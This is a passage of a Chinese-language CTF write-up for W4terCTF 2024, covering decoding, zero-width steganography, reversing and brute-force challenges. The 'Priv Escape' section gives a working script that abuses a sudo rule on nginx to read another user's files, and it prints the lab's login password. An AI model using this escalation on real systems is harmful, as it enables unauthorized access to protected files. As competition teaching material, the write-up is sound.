class=\"line\">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒</span><br><span class=\"line\"></span><br><span class=\"line\">Btw, the <span class=\"keyword\">key</span> <span class=\"built_in\">is</span> <span class=\"string\">&quot;KEY&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>使用 https://aghorler.github.io/emoji-aes/</p>\n<p>key = 🔑, 得到</p>\n<p><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl<span class=\"regexp\">/QW1FAW1/</span>bW57EhQSEF0=</span><br></pre></td></tr></table></figure></p>\n<p>进行 base64 解码</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/NcwrtAGylDIOVU9.png\" alt=\"spam2024\" /></p>\n<p>做异或操作，可以猜测开头就是 <code>W4</code></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = <span class=\"comment\"># base64解码后的数据</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(s)&gt;<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    arr = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        arr.append(<span class=\"built_in\">ord</span>(x))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(arr)</span><br><span class=\"line\">    h = <span class=\"built_in\">ord</span>(s[<span class=\"number\">0</span>])^<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;W&#x27;</span>)</span><br><span class=\"line\">    l = <span class=\"built_in\">ord</span>(s[<span class=\"number\">1</span>])^<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i,x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(arr):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            arr[i] = arr[i]^h</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            arr[i] = arr[i]^l</span><br><span class=\"line\">    ret = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> arr:</span><br><span class=\"line\">        ret += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ret)</span><br><span class=\"line\">    s=s[<span class=\"number\">1</span>:<span class=\"built_in\">len</span>(s)]</span><br></pre></td></tr></table></figure></p>\n<p>得到:</p>\n<p><code>W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p>\n<h2 id=\"gzgpt\"><a class=\"anchor\" href=\"#gzgpt\">#</a> GZGPT</h2>\n<p>这里漏出鸡脚了：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/BWxuKC4v8Zzc3bj.png\" alt=\"鸡脚\" /></p>\n<p>于是分析每一行的末尾：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;output.log&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    lines = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">tails = [line[-<span class=\"number\">9</span>:-<span class=\"number\">1</span>] <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines]</span><br><span class=\"line\">tails = [tail <span class=\"keyword\">for</span> tail <span class=\"keyword\">in</span> tails <span class=\"keyword\">if</span> tail[-<span class=\"number\">1</span>] <span class=\"keyword\">in</span> (<span class=\"string\">&#x27;\\u200c&#x27;</span>, <span class=\"string\">&#x27;\\u200d&#x27;</span>)]</span><br><span class=\"line\">tails[:<span class=\"number\">10</span>]</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight clojure\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200d</span>&#x27;<span class=\"punctuation\">,</span></span><br><span class=\"line\"> &#x27;<span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200c</span><span class=\"character\">\\u200d</span>&#x27;]</span><br></pre></td></tr></table></figure></p>\n<p>可以看到有一些行的末尾有且仅有 8 个这种不可见字符，不是所有行都有，但是经验证，这样的行的数量每次都是恒定的。</p>\n<p>八位，两种字符，一种当 0 一种当 1 试了试：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;\\u200c&quot;</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;\\u200d&quot;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">b_tails = <span class=\"string\">&quot;&quot;</span>.join([<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(d[c]) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> tail]), <span class=\"number\">2</span>)) <span class=\"keyword\">for</span> tail <span class=\"keyword\">in</span> tails])</span><br><span class=\"line\">b_tails</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">W<span class=\"number\">4</span>terCTF&#123;I<span class=\"symbol\">NTRUdER_o1</span>_mY_H<span class=\"number\">3</span>ART_l<span class=\"symbol\">n_APR1</span>l&#125;W<span class=\"number\">4</span>terCTF&#123;I<span class=\"symbol\">NTRUdER_o1</span>_mY_H<span class=\"number\">3</span>ART_l<span class=\"symbol\">n_APR1</span>l&#125;W<span class=\"number\">4</span>terCTF&#123;I<span class=\"symbol\">NTRUdER_o1</span>_mY_H<span class=\"number\">3</span>ART_l<span class=\"symbol\">n_APR1</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"priv-escape\"><a class=\"anchor\" href=\"#priv-escape\">#</a> Priv Escape</h2>\n<p>首先找 flag ，在  <code>/tmp/flag</code>  找到了，但是没权限读！然后还发现这个文件的 owner 居然不是  <code>root</code>  ，而是  <code>r00t</code>  （什么高仿 root），这或许就意味着不需要 root 权限也能得到 flag 。</p>\n<p><code>find</code>  查找和  <code>r00t</code>  用户有关的所有文件、目录，会发现 nginx 非常可疑，但这还不够。</p>\n<p>关键切入点在于查看与本用户执行权限相关信息：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l</span><br></pre></td></tr></table></figure></p>\n<p>然后发现 nginx 露出了鸡脚：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User W4terCTFPlayer may run the following commands on</span><br><span class=\"line\">        priv-escape-5ee9f22c905b4d86:</span><br><span class=\"line\">    (r00t) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure></p>\n<p>这意味着我们的用户可以以  <code>r00t</code>  的身份运行 nginx ，那么依靠 nginx 的网页我们就能读取  <code>/tmp/flag</code>  。</p>\n<p>直接运行  <code>sudo -u r00t nginx</code>  ，虽然启动了 nginx ，但是我们不知道咋访问  <code>/tmp/flag</code>  ，因为权限问题也无法将  <code>/tmp/flag</code>  软链接到  <code>/var/www/html</code>  ，所以我们搞了个脚本用自己的 nginx 配置：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>hack.sh</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">cp -rf /etc/nginx /home/W4terCTFPlayer/nginx</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;user r00t;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">pid /home/W4terCTFPlayer/nginx/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">\tworker_connections 768;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">\tsendfile on;</span><br><span class=\"line\">\ttcp_nopush on;</span><br><span class=\"line\">\ttypes_hash_max_size 2048;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinclude /home/W4terCTFPlayer/nginx/mime.types;</span><br><span class=\"line\">\tdefault_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class=\"line\">\tssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">\tgzip on;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinclude /home/W4terCTFPlayer/nginx/conf.d/*.conf;</span><br><span class=\"line\">\tinclude /home/W4terCTFPlayer/nginx/sites-enabled/*;</span><br><span class=\"line\">&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/nginx.conf</span><br><span class=\"line\"></span><br><span class=\"line\">rm /home/W4terCTFPlayer/nginx/sites-enabled/default</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;server &#123;</span><br><span class=\"line\">\tlisten 8083 default_server;</span><br><span class=\"line\">\tlisten [::]:8083 default_server;</span><br><span class=\"line\"></span><br><span class=\"line\">\troot /tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">\tindex index.html index.nginx-debian.html;</span><br><span class=\"line\"></span><br><span class=\"line\">\tserver_name _;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\ttry_files $uri $uri/ =404;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;&quot; &gt; /home/W4terCTFPlayer/nginx/sites-enabled/default</span><br><span class=\"line\"></span><br><span class=\"line\">echo &#x27;&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    114514</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;&#x27; &gt; /tmp/index.html</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 -R /home/W4terCTFPlayer # 不要忘了给 r00t 我们的文件目录访问权限</span><br><span class=\"line\"></span><br><span class=\"line\">sudo -u r00t nginx -c /home/W4terCTFPlayer/nginx/nginx.conf # 启动nginx</span><br></pre></td></tr></table></figure></p>\n<p>然后执行：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">We1c0meToW4terCTF2024!</span></span><br><span class=\"line\"></span><br><span class=\"line\">scp -P 64780 hack.sh W4terCTFPlayer@127.0.0.1:/home/W4terCTFPlayer  # 输入一下密码</span><br><span class=\"line\"></span><br><span class=\"line\">ssh W4terCTFPlayer@127.0.0.1 -p 64780  # 输入一下密码</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 hack.sh</span><br><span class=\"line\"></span><br><span class=\"line\">./hack.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">sudo -u r00t nginx -s reload -c /home/W4terCTFPlayer/nginx/nginx.conf  <span class=\"comment\"># 用来重新加载 nginx 配置文件</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">curl https://127.0.0.1:8083/flag</span><br></pre></td></tr></table></figure></p>\n<p>然而中途遇到了阻碍，写 WP 的时候才发现似乎是因为我们写脚本的同学用的 mac 的 shell 导致的，在 echo 的时候将  <code>/home/W4terCTFPlayer/nginx/sites-enabled/default</code>  里的  <code>$uri</code>  当成了环境变量？！然后 nginx 返回 301 ...... 脚本里把  <code>$uri</code>  改成  <code>\\$uri</code>  就好了</p>\n<p><code>W4terCTF&#123;eScAp3_THE_BouNdarles_OF_n9lnX_pRIvi1eGeS&#125;</code></p>\n<h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h1>\n<h2 id=\"bruteforceme\"><a class=\"anchor\" href=\"#bruteforceme\">#</a> BruteforceMe</h2>\n<p>下载的附件是一个程序，运行程序后可以输入 flag，程序会判断 flag 长度是否正确，如果长度正确，会给出 flag 经过加密后经比对有多少字符符合</p>\n<p>所以，只需要一个 python 脚本猜测每一位的字符，脚本如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">input_data = <span class=\"string\">&quot;W4terCTF###################################&quot;</span> <span class=\"comment\"># len = 43</span></span><br><span class=\"line\">arr = <span class=\"built_in\">list</span>(input_data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(arr)</span><br><span class=\"line\">voc = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_&quot;</span></span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">    input_data = <span class=\"string\">&#x27;&#x27;</span>.join(arr)</span><br><span class=\"line\">    command = [<span class=\"string\">&quot;./BruteforceMe&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 作为子进程启动外部程序</span></span><br><span class=\"line\">    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输入数据到程序的标准输入</span></span><br><span class=\"line\"></span><br><span class=\"line\">    process.stdin.write(input_data)</span><br><span class=\"line\">    process.stdin.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 从标准输出读取程序的输出</span></span><br><span class=\"line\">    output_data, _ = process.communicate()</span><br><span class=\"line\">    <span class=\"comment\">#print(output_data)</span></span><br><span class=\"line\">    j=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i,x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(output_data):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> x.isnumeric():</span><br><span class=\"line\">            j=i+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    tmp=[]</span><br><span class=\"line\">    <span class=\"keyword\">while</span> output_data[j].isnumeric():</span><br><span class=\"line\">        tmp.append(output_data[j])</span><br><span class=\"line\">        j+=<span class=\"number\">1</span></span><br><span class=\"line\">    c_num = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(tmp))</span><br><span class=\"line\">    <span class=\"comment\">#print(input_data)</span></span><br><span class=\"line\">    <span class=\"comment\"># 打印输出</span></span><br><span class=\"line\">    <span class=\"comment\">#print(output_data)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(c_num)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> c_num</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">while</span> get_flag() &lt; <span class=\"number\">60</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 随机打乱voc</span></span><br><span class=\"line\">    voc = <span class=\"built_in\">list</span>(voc)</span><br><span class=\"line\">    random.shuffle(voc)</span><br><span class=\"line\">    voc = <span class=\"string\">&#x27;&#x27;</span>.join(voc)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">43</span>):</span><br><span class=\"line\">        old = get_flag()</span><br><span class=\"line\">        <span class=\"comment\">#print(f&quot;&#123;t&#125;,&#123;old&#125;: &quot;)</span></span><br><span class=\"line\">        cur_best = old</span><br><span class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> voc:</span><br><span class=\"line\">            old_arr = arr[t]</span><br><span class=\"line\">            arr[t]=v</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(arr))</span><br><span class=\"line\">            new = get_flag()</span><br><span class=\"line\">            arr[t]=old_arr</span><br><span class=\"line\">            <span class=\"keyword\">if</span> new &gt;= cur_best:</span><br><span class=\"line\">                <span class=\"comment\">#print(f&quot;&#123;v&#125;,&#123;new&#125;;&quot;,end=&#x27; &#x27;)</span></span><br><span class=\"line\">                arr[t]=v</span><br><span class=\"line\">                cur_best = new</span><br><span class=\"line\">        <span class=\"comment\">#print(&#x27;&#x27;)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;best: <span class=\"subst\">&#123;get_flag()&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join(arr))</span><br></pre></td></tr></table></figure></p>\n<p>在和 BruteforceMe 同文件夹下执行这个脚本，直到程序遇到报错停止，最后一个输出就是 flag</p>\n<p>一般 while 循环执行 3 轮就能得到结果，运行时间 1 分钟以内</p>\n<p><code>W4terCTF&#123;UnR3IAtED_8y73S_CAN_6e_3nUmErAT3d&#125;</code></p>\n<h2 id=\"安安又卓卓\"><a class=\"anchor\" href=\"#安安又卓卓\">#</a> 安安又卓卓</h2>\n<h3 id=\"第一问剪刀石头布\"><a class=\"anchor\" href=\"#第一问剪刀石头布\">#</a> 第一问：剪刀石头布</h3>\n<p>这一问可以使用 APKTool 进行逆向</p>\n<p>用法参考 https://juejin.cn/post/7216968724938195001</p>\n<p>可以得到反编译的 Smali 代码</p>\n<p>在 <code>smali\\com\\w4ter\\w4terctf2024\\FirstChall.smali</code>  中找到以下代码</p>\n<p><figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:array_0</span><br><span class=\"line\"><span class=\"keyword\">    .array</span>-data 2</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x33s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x33s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\">        0x33s</span><br><span class=\"line\">        0x31s</span><br><span class=\"line\">        0x32s</span><br><span class=\"line\"><span class=\"keyword\">        .</span>.....</span><br></pre></td></tr></table></figure></p>\n<p>经验证，这是机器的出拳顺序</p>\n<p>要想赢得机器，对手出 2，我出 1，对手出 3，我出 2，对手出 1，我出 